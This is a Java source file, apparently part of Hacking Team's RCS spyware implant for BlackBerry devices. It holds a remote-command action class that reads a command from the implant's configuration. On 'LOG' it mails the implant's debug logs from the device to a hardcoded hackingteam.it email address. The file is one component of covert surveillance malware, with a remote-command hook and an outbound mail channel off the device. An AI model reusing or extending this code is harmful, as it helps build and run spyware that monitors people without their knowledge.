//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.StringUtilities;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Sendmail;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
    //#endif
    private String command;

    /**
     * Instantiates a new execute action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        //#ifdef DEBUG_INFO
        debug.info("Execute: " + command);
        debug.info("Event: " + eventName);
        //#endif

        if (command == null) {
            return false;
        }

        Vector params = new Vector();
        String cmd = getParams(command, params);

        if (cmd.equals("DEBUG")) {
            executeDebug(params);
        } else if (cmd.equals("LOG")) {
            executeLog(params);
        }

        return true;
    }

    void executeLog(Vector params) {

        Vector logs = Debug.getLogs();
        if (logs == null) {
            return;
        }

        StringBuffer sb = new StringBuffer();
        int blockLines = 100;
        int count = 1;
        for (int i = 0; i < logs.size(); i++) {

            String line = (String) logs.elementAt(i);
            sb.append(line);
            sb.append("\r\n");

            if (i % blockLines == blockLines - 1) {
                //#ifdef DEBUG_TRACE
                debug.trace("executeLog: " + count);
                //#endif
                Sendmail.send("zeno@hackingteam.it", "logs", sb.toString());
                sb = new StringBuffer();
            }
        }

    }

    void executeDebug(Vector params) {

    }

    private static String getParams(String fullCommand, Vector params) {

        //#ifdef DBC
        Check.requires(fullCommand != null, "getParams cmd !=null");
        Check.requires(params != null, "getParams params !=null");
        Check.requires(params.size() == 0, "getParams params.size() == 0");
        //#endif

        String[] array = StringUtilities.stringToWords(fullCommand);

        //#ifdef DBC
        Check.asserts(array != null, "getParams array !=null");
        Check.asserts(array.length > 0, "getParams array.length > 0");
        //#endif

        for (int i = 1; i < array.length; i++) {
            params.addElement(array[i]);
        }

        return array[0];
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        if (confParams == null) {
            command = "DEBUG";
        } else {
            // estrarre la stringa.
            final DataBuffer databuffer = new DataBuffer(confParams, 0,
                    confParams.length, false);
            try {
                int len = databuffer.readInt();
                byte[] buffer = new byte[len];
                databuffer.read(buffer);
                command = WChar.getString(buffer, true);

            } catch (final EOFException e) {

                return false;
            }
        }

        //#ifdef DEBUG_INFO
        debug.info("command: " + command);

        //#endif
        return true;
    }

}
